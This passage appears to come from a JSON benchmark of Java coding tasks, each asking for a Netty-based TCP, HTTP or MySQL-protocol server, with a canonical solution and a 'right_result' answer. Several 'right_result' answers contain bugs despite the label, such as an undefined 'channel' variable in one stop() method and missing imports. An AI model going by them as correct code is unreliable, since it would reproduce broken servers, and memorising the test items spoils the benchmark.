standardThreadExecutor = null;\n        channel = null;\n        state = ChannelState.CLOSE;\n        StatsUtil.unRegistryStatisticCallback(this);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport java.net.URL;\n\npublic class Netty4HttpServer extends AbstractServer<URL> implements StatisticCallback {\n\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler handler) {\n        this.url = url;\n        this.httpMessageHandler = handler;\n    }\n\n    @Override\n    public boolean open() {\n        try {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup(standardThreadExecutor.getCorePoolSize());\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) throws Exception {\n                             processHttpRequest(ctx, req);\n                         }\n                     });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            channel = b.bind(url.getPort()).sync().channel();\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    @Override\n    public void close(int timeout) {\n        try {\n            channel.closeFuture().get(timeout);\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse = httpMessageHandler.handle(httpRequest);\n        sendResponse(ctx, httpResponse);\n    }\n\n    @Override\n    public void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        ctx.writeAndFlush(httpResponse).addListener(ChannelFutureListener.CLOSE);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n\n    // Assume StandardThreadExecutor and other necessary classes are defined elsewhere\n}\n```"
  },
  {
    "Task_id": 165,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable thread pool, and managing server lifecycle.\n\nClass Description: NettyServer is a TCP server implementation that uses Netty framework for non-blocking I/O operations. It manages server connections, processes incoming requests through a thread pool, and provides lifecycle control (open/close) for the server.\n\nAttributes:\n- channelManage: [NettyServerChannelManage] - Manages active server channels and connections\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- serverChannel: [Channel] - The main server channel listening for connections\n- messageHandler: [MessageHandler] - Handler for processing incoming messages\n- threadPoolExecutor: [ThreadPoolExecutor] - Thread pool for request processing\n- rejectCounter: [AtomicInteger] - Counter for rejected requests\n- logger: [Logger] - Logger instance for server operations\n- url: [URL] - Configuration URL containing server parameters\n- state: [ChannelState] - Current state of the server channel\n- codec: [Codec] - Codec for message serialization/deserialization\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools and Netty components, binds to configured port\n- close([int] timeout) -> [void] - Shuts down the server gracefully, releasing all resources\n- cleanup() -> [void] - Internal method for resource cleanup during server shutdown\n- NettyServer([URL] url, [MessageHandler] messageHandler) - Constructor initializing server with configuration and message handler",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.hongxi.summer.common.ChannelState;\nimport org.hongxi.summer.common.SummerConstants;\nimport org.hongxi.summer.common.URLParamType;\nimport org.hongxi.summer.common.threadpool.DefaultThreadFactory;\nimport org.hongxi.summer.common.threadpool.StandardThreadPoolExecutor;\nimport org.hongxi.summer.exception.SummerFrameworkException;\nimport org.hongxi.summer.rpc.Request;\nimport org.hongxi.summer.rpc.Response;\nimport org.hongxi.summer.rpc.URL;\nimport org.hongxi.summer.transport.AbstractServer;\nimport org.hongxi.summer.transport.MessageHandler;\nimport org.hongxi.summer.transport.TransportException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n\n    protected NettyServerChannelManage channelManage;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private ThreadPoolExecutor threadPoolExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            logger.warn(\"server channel already open, url={}\", url);\n            return state.isAliveState();\n        }\n\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        logger.info(\"server channel start open, url={}\", url);\n        boolean shareChannel = url.getBooleanParameter(\n                URLParamType.shareChannel.getName(), URLParamType.shareChannel.boolValue());\n        int maxContentLength = url.getIntParameter(\n                URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.intValue());\n        int maxServerConnections = url.getIntParameter(\n                URLParamType.maxServerConnections.getName(), URLParamType.maxServerConnections.intValue());\n        int maxQueueSize = url.getIntParameter(\n                URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.intValue());\n\n        int minWorkerThreads;\n        int maxWorkerThreads;\n        if (shareChannel) {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        } else {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        }\n\n        if (threadPoolExecutor == null || threadPoolExecutor.isShutdown()) {\n            threadPoolExecutor = new StandardThreadPoolExecutor(minWorkerThreads, maxWorkerThreads,\n                    maxQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        }\n        threadPoolExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnections);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        ChannelPipeline pipeline = socketChannel.pipeline();\n                        pipeline.addLast(\"channel_manage\", channelManage);\n                        pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                        pipeline.addLast(\"encoder\", new NettyEncoder());\n                        pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, threadPoolExecutor));\n                    }\n                });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        state = ChannelState.ALIVE;\n        logger.info(\"server channel finished open: url={}\", url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) return;\n\n        try {\n            cleanup();\n            if (state.isUnInitState()) {\n                logger.info(\"Server close failed, state={}, uri={}\", state.value(), url.getUri());\n                return;\n            }\n\n            state = ChannelState.CLOSE;\n            logger.info(\"Server close success, uri={}\", url.getUri());\n        } catch (Exception e) {\n            logger.error(\"Server close error, uri={}\", url.getUri(), e);\n        }\n    }\n\n    private void cleanup() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n            bossGroup = null;\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        if (channelManage != null) {\n            channelManage.close();\n        }\n        if (threadPoolExecutor != null) {\n            threadPoolExecutor.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.URL;\nimport java.util.concurrent.*;\n\npublic class NettyServer {\n    private final NettyServerChannelManage channelManage = new NettyServerChannelManage();\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private ThreadPoolExecutor threadPoolExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n    private URL url;\n    private ChannelState state = ChannelState.CLOSED;\n    private Codec codec;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        this.url = url;\n        this.messageHandler = messageHandler;\n    }\n\n    public boolean open() {\n        try {\n            int port = Integer.parseInt(url.getParameter(\"port\"));\n            int numThreads = Integer.parseInt(url.getParameter(\"threads\"));\n\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup(numThreads);\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(codec);\n                     p.addLast(messageHandler);\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            serverChannel = b.bind(port).sync().channel();\n            state = ChannelState.OPEN;\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (state == ChannelState.OPEN) {\n            state = ChannelState.CLOSING;\n            try {\n                serverChannel.closeFuture().get(timeout, TimeUnit.SECONDS);\n            } catch (TimeoutException e) {\n                logger.warn(\"Server close timed out\");\n            } catch (InterruptedException | ExecutionException e) {\n                logger.error(\"Error during server shutdown\", e);\n            } finally {\n                cleanup();\n            }\n        }\n    }\n\n    private void cleanup() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (threadPoolExecutor != null) {\n            threadPoolExecutor.shutdownNow();\n        }\n        logger.info(\"Server resources cleaned up\");\n    }\n}\n```"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP server for handling RPC (Remote Procedure Call) requests. The server should manage incoming connections, process HTTP requests, and handle server lifecycle events (start/stop).\n\nClass Description: NettyHttpServer is a server implementation that uses Netty framework to create a non-blocking HTTP server capable of handling RPC requests. It manages thread pools for request processing and implements proper resource cleanup during shutdown.\n\nAttributes:\n- thread: Thread - The thread in which the Netty server runs\n- logger: Logger - Logger instance for server events (inherited from parent class)\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty HTTP server on a specified port, initializes thread pools, and sets up request handlers\n  - Input: xxlRpcProviderFactory - Configuration factory containing server parameters like port number and thread pool sizes\n  - Output: None (server runs asynchronously in a separate thread)\n  \n- stop() -> void - Stops the server gracefully by interrupting the server thread and shutting down all resources\n  - Input: None\n  - Output: None (performs cleanup operations)\n\nThe implementation should follow Netty best practices including:\n1. Using separate event loop groups for connection acceptance and request processing\n2. Proper channel pipeline configuration with HTTP codecs and aggregator\n3. Idle connection handling\n4. Graceful shutdown of all resources\n5. Thread pool management for request processing\n6. Proper error handling and logging",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.Server;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                    NettyHttpServer.class.getSimpleName(),\n                    xxlRpcProviderFactory.getCorePoolSize(),\n                    xxlRpcProviderFactory.getMaxPoolSize());\n            EventLoopGroup bossGroup = new NioEventLoopGroup();\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n            try {\n                ServerBootstrap bootstrap = new ServerBootstrap();\n                bootstrap.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            public void initChannel(SocketChannel channel) {\n                                channel.pipeline()\n                                        .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL * 3, TimeUnit.SECONDS))\n                                        .addLast(new HttpServerCodec())\n                                        .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                        .addLast(new NettyHttpServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                            }\n                        })\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                logger.info(\">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}\", NettyHttpServer.class.getName(), xxlRpcProviderFactory.getPort());\n                onStarted();\n\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                if (e instanceof InterruptedException) {\n                    logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                } else {\n                    logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                }\n            } finally {\n                try {\n                    serverHandlerPool.shutdown();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n                try {\n                    workerGroup.shutdownGracefully();\n                    bossGroup.shutdownGracefully();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyHttpServer {\n    private Thread thread;\n    private Logger logger = LoggerFactory.getLogger(NettyHttpServer.class);\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        int port = xxlRpcProviderFactory.getPort();\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new HttpServerCodec());\n                            p.addLast(new HttpObjectAggregator(65536));\n                            p.addLast(new IdleStateHandler(0, 0, 60));\n                            p.addLast(new RpcRequestHandler(xxlRpcProviderFactory));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            logger.info(\"Netty HTTP server started on port {}\", port);\n            thread = new Thread(() -> {\n                try {\n                    f.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    logger.error(\"Error occurred while waiting for server to close\", e);\n                }\n            });\n            thread.start();\n        } catch (Exception e) {\n            logger.error(\"Failed to start Netty HTTP server\", e);\n        }\n    }\n\n    public void stop() {\n        if (thread != null && !thread.isInterrupted()) {\n            thread.interrupt();\n        }\n        EventLoopGroup bossGroup = (EventLoopGroup) ((DefaultChannelPipeline) channel.pipeline()).getChannelHandlerContext(\"boss\").channel().eventLoop();\n        EventLoopGroup workerGroup = (EventLoopGroup) ((DefaultChannelPipeline) channel.pipeline()).getChannelHandlerContext(\"worker\").channel().eventLoop();\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        logger.info(\"Netty HTTP server stopped\");\n    }\n}\n```"
  },
  {
    "Task_id": 167,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts incoming connections, and processes client requests using a custom handler. The server uses non-blocking I/O and is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nDiscardServer: (int port) -> void - Constructor that initializes the server with the specified port number\nrun: () -> void - Starts the server, binds it to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup\nmain: (String[] args) -> void - Entry point that creates and starts the server instance with either a specified port or default port 8080",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n\n    private int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;\n        new DiscardServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n    private int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your custom handler here\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        new DiscardServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 168,
    "Instruction": "Task Description: Create a Java class that implements a MySQL-compatible Netty TCP server to handle client connections and MySQL protocol communication.\n\nClass Description: The MysqlNettyServer class is a Netty-based TCP server that handles MySQL protocol connections. It manages client connections, processes MySQL protocol messages, and maintains connection state. The server uses Netty's non-blocking I/O model for high performance.\n\nAttributes:\n- host: String - The host address the server binds to (nullable)\n- port: int - The port number the server listens on\n- connections: static Map<String, MysqlConnection> - Thread-safe map storing active MySQL connections by connection ID\n- eventLoopGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- server: ServerBootstrap - Netty server bootstrap instance for server configuration\n\nMethods:\n- start() -> void - Starts the Netty server, binds to the specified host and port, and begins accepting connections. Throws Exception if binding fails.\n- channelInitializer() -> ChannelInitializer<SocketChannel> - Creates and returns a channel initializer that sets up the pipeline for new connections, including handlers for MySQL protocol processing.\n- close() -> void - Shuts down the server gracefully by closing all connections and releasing resources.\n\nThe class uses Netty's NIO transport and includes handlers for:\n1. MySQL handshake protocol\n2. MySQL message decoding\n3. Connection idle state management\n4. MySQL command processing\n5. Exception handling\n\nThe server maintains thread-safe tracking of active connections and automatically cleans up closed connections.",
    "Canonical_solution": "import io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.dingodb.driver.mysql.MysqlConnection;\nimport io.dingodb.net.netty.NettyHandlers;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioChannelOption;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.StandardSocketOptions;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Slf4j\n@Getter\n@Builder\npublic class MysqlNettyServer {\n    public final String host;\n    public final int port;\n    public static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(151,\n            new ThreadPoolBuilder().name(\"mysql server \" + port).coreThreads(151).maximumThreads(151).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childOption(ChannelOption.SO_KEEPALIVE, Boolean.TRUE)\n            .childOption(NioChannelOption.of(StandardSocketOptions.SO_KEEPALIVE), Boolean.TRUE)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                MysqlConnection mysqlConnection = new MysqlConnection(ch);\n                ch.closeFuture().addListener(f -> {\n                    if (mysqlConnection.getId() != null) {\n                        connections.remove(mysqlConnection.getId());\n                    }\n                }).addListener(f -> mysqlConnection.close());\n                ch.pipeline().addLast(\"handshake\", new HandshakeHandler(mysqlConnection));\n                ch.pipeline().addLast(\"decoder\", new MysqlDecoder());\n                MysqlIdleStateHandler mysqlIdleStateHandler = new MysqlIdleStateHandler(\n                    28800, 60);\n                mysqlConnection.mysqlIdleStateHandler = mysqlIdleStateHandler;\n                ch.pipeline().addLast(\"idleStateHandler\", mysqlIdleStateHandler);\n                ch.pipeline()\n                    .addLast(\"mysqlHandler\", new MysqlHandler(mysqlConnection));\n                ch.pipeline().addLast(\"exception\", new NettyHandlers.ExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class MysqlNettyServer {\n    private String host;\n    private int port;\n    public static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public MysqlNettyServer(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.server = new ServerBootstrap()\n                .group(eventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(channelInitializer());\n    }\n\n    public void start() throws Exception {\n        ChannelFuture future = server.bind(host, port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(new IdleStateHandler(0, 0, 60));\n                pipeline.addLast(new MysqlHandshakeHandler());\n                pipeline.addLast(new MysqlMessageDecoder());\n                pipeline.addLast(new MysqlCommandProcessor());\n                pipeline.addLast(new MysqlExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        connections.values().forEach(MysqlConnection::close);\n        eventLoopGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 169,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles incoming client connections and processes requests using a RESTful service configuration.\n\nClass Description: NettyRestfulService is a final class that implements a RestfulService interface, providing functionality to start and stop a Netty TCP server with configurable host and port settings. It uses Netty's NIO event loop groups for efficient connection handling and includes proper resource cleanup during shutdown.\n\nAttributes:\n- DEFAULT_WORKER_GROUP_THREADS: [int] - Default number of worker threads calculated based on available processors\n- config: [NettyRestfulServiceConfiguration] - Configuration object containing host and port settings\n- serverBootstrap: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n- bossEventLoopGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerEventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n\nMethods:\n- initServerBootstrap() -> [void] - Initializes the server bootstrap with event loop groups, channel type, and pipeline handlers\n- startup() -> [void] - Starts the server by binding to the configured host and port, logs success/failure\n- shutdown() -> [void] - Gracefully shuts down the server by closing event loop groups and releasing resources",
